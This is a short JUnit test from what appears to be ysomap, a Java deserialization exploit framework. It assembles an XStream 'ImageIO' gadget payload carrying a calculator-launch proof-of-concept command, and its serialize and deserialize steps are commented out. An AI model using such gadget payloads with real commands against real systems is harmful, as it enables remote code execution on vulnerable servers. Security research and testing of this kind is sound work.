package ysomap.core.payload.xstream;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.serializer.Serializer;

/**
 * @author wh1t3P1g
 * @since 2020/4/15
 */
public class ImageIOTest {

    @Test
    public void pack() throws Exception {
        Payload payload = new ImageIO();
        Serializer serializer = payload.getSerializer();
        Bullet bullet = payload.getDefaultBullet("open /System/Applications/Calculator.app");
//        payload.setBullet(bullet);
//        Object obj = payload.getObject();
//        String xml = (String) serializer.serialize(obj);
//        serializer.deserialize(xml);
    }
}